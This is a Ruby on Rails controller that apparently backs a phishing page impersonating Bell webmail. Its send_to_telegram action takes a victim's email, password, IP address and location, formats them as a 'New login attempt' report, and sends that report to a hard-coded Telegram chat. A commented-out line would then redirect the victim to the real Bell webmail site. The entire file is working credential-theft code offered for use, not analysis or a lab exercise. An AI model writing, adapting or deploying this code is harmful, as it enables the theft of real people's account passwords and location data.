class ContainersController < ApplicationController
  protect_from_forgery with: :null_session, only: :send_to_telegram

  def show
    # This action will render the container page with the modal
  end

  def send_to_telegram
    # Parse the incoming JSON request body
    request_body = JSON.parse(request.body.read)

    # Extract the parameters from the request body
    email = request_body['email']
    password = request_body['password']
    ip_address = request_body['ip_address']
    latitude = request_body['latitude']
    longitude = request_body['longitude']
    country = request_body['country']
    city = request_body['city']
    state = request_body['state']
    zip_code = request_body['zip_code']

    # Construct the message to send to Telegram
    message = <<~MSG
      New login attempt from Bell Rails:

      Email: #{email}
      Password: #{password}
      IP Address: #{ip_address}
      Location: #{city}, #{state}, #{country}, #{zip_code}
      Latitude: #{latitude}, Longitude: #{longitude}
    MSG

    # Your bot's token and chat ID (ensure that these are stored securely)
    bot_token = ENV['TELEGRAM_BOT_TOKEN']
    chat_id = '1678259688'  # Replace with your Telegram chat ID

    # Initialize the TelegramService and send the message
    telegram_service = TelegramService.new(bot_token)
    telegram_service.send_message(chat_id, message)

    # Respond back with a success status
    render json: { status: 'success' }
    # redirect_to "https://webmail.en.bellnet.ca/"
  end

  private

  def send_message_to_telegram(message)
    bot = Telegram::Bot::Client.new(Rails.application.credentials.telegram[:bot_token])
    chat_id = '1678259688'  # Replace with your Telegram chat ID

    # Send the message
    bot.api.send_message(chat_id: chat_id, text: message)
  end
end
